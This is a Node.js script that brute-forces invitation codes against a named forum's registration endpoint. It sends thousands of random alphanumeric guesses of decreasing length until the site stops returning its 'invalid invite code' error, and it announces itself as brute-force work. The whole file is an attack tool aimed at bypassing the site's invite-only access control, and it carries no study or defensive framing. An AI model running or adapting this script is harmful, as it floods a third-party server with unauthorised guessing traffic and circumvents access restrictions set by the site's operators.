// import axios from 'axios';
const axios = require('axios');
const errMsg = '抱歉，邀请码错误，请重新填写，没有邀请码不允许注册';
const regex = new RegExp(`.*${errMsg}.*`);

function generatePassword(i) {
    var length = i,
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        retVal = "";
    for (var i = 0, n = charset.length; i < length; ++i) {
        retVal += charset.charAt(Math.floor(Math.random() * n));
    }
    return retVal;
}

  async function getUsers(arg) {
    try {
      const get = await axios.get(`http://zukka832skc.xyz/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkinvitecode&invitecode=${arg}`)
      const { data } = get
      let res = regex.test(`${data}`);
      if(!res){
      	return data
      }
      return false
    } catch (error) {
      throw new Error(error)
    }
  }


async function start(){
	console.log("爆破工作開始!")
	for(let i = 25; i>5; i--){
		console.log(`length = ${i}`)
		for (let j = 1000; j >= 0; j--) {
			let res = await getUsers(generatePassword(i));
			if(res){
				console.log(res)
				return 0
			}
		}
	}
	console.log("運氣不太好:(")
}

start()
